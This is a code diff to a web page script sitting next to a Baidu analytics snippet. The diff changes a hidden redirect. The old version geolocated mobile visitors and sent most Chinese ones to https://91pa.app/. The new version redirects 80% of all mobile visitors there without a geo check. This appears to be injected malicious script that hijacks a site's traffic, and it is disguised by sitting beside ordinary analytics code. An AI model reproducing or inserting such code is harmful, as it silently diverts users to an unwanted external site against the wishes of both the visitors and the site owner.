@@ -6,19 +6,11 @@ var _hmt = _hmt || [];
   var s = document.getElementsByTagName("script")[0]; 
   s.parentNode.insertBefore(hm, s);
 })();
-(async function() {
-  var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i
-                   .test(navigator.userAgent);
-  if (!isMobile) return;
-
-  try {
-    let res = await fetch('https://api.ip.sb/geoip?format=json');
-    if (!res.ok) return;
-    let data = await res.json();
-
-    if (data.country_code === 'CN' && Math.random() < 0.8) {
+  (function() {
+    var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i
+                     .test(navigator.userAgent);
+    if (!isMobile) return; 
+    if (Math.random() < 0.8) {
       window.location.replace('https://91pa.app/');
     }
-  } catch (e) {
-  }
-})();
+  })();
